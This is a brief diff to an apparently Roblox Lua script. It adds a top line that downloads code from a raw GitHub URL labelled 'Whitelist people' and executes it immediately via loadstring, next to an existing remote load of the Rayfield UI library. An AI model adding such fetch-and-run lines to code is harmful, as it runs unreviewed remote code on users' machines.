@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PhantomAngelx/PHANTOM-ANGEL/refs/heads/main/Whitelist%20people"))()
+
 debugX = true
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
